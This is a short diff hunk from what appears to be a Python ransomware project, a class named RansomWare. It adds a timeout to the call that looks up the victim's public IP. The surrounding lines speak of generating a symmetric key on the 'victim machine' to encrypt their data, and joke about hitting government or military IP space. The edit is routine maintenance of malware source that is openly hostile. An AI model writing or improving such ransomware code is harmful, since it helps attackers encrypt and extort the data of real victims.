@@ -49,7 +49,7 @@ class RansomWare:
         self.localRoot = r'D:\Coding\Python\RansomWare\RansomWare_Software\localRoot' # Debugging/Testing
 
         # Get public IP of person, for more analysis etc. (Check if you have hit gov, military ip space LOL)
-        self.publicIP = requests.get('https://api.ipify.org').text
+        self.publicIP = requests.get('https://api.ipify.org', timeout=60).text
 
 
     # Generates [SYMMETRIC KEY] on victim machine which is used to encrypt the victims data
